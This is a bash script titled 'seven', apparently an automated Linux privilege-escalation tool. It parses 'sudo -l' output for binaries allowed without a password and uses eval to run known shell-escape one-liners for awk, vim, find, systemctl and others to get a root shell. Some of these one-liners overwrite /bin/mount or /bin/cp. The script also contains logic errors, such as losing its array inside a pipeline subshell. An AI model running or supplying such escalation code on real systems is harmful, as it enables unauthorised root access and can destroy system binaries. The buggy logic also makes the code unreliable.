#!/bin/bash

#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
default="\e[0m"

# Design
function top(){
	clear
	sleep 0.1 && echo -e "$blue "
 		sleep 0.1 && echo -e "	 ___  _____   _____ _ __  "
		sleep 0.1 && echo -e "	/ __|/ _ \ \ / / _ \ |_ \ "
		sleep 0.1 && echo -e "	\__ \  __/\ V /  __/ | | |"
		sleep 0.1 && echo -e "	|___/\___| \_/ \___|_| |_|"          
        sleep 0.1 && echo -e "$default"
	echo
	echo
}

top

declare -A commandObj
commandObj["awk"]="sudo awk 'BEGIN {system(\"/bin/sh\")}'"
commandObj["vim"]="sudo vim -c ':!/bin/sh'"
commandObj["less"]="sudo less /etc/profile"
commandObj["mount"]="sudo mount -o bind /bin/sh /bin/mount;sudo mount"
commandObj["find"]="sudo find . -exec /bin/sh \; -quit"
commandObj["systemctl"]="sudo systemctl;!sh"
commandObj["tee"]="LFILE=/usr/bin/sh;echo DATA | sudo tee -a '$LFILE'"
commandObj["cp"]="sudo cp /bin/sh /bin/cp;sudo cp"

echo -ne $yellow"[+] Checking for Vulnerabilities!..."$default
nopassTools=()
#nopassTools=$(sudo -l | grep "(root) NOPASS" | awk -F'/' '{print $NF}')
sudo -l | grep "(root) NOPASS" | while read line; do
  if [[ "$line" =~ '/' ]]; then 
    IFS=',' read -ra parts <<< "$line"
    for part in "${parts[@]}"; do
      word="${part##*/}"
      word="${word%,}"
      nopassTools+=("$word")
    done
  fi
done
echo -e $blue"Done!"$default

if [ ${#nopassTools} -eq 0 ]; then
    echo -e $red"[*] No Vulnerabilities Found!..."$default
else
    echo -ne $yellow"[+] Vulnerabilities Found!..."$default
    echo -e $blue"Done!"$default
    for tool in ${nopassTools}; do
        if [ -n "${nopassTools["$tool"]}" ]; then
            echo -ne $yellow"[+] Getting root rights with: "$default
            echo -e $blue"$tool"$default
            command="${commandObj[$tool]}"
            if [ -n "$command" ]; then
                echo -e $blue"Done!"$default
                eval "$command"
                exit 1
            fi
        fi
    done
fi
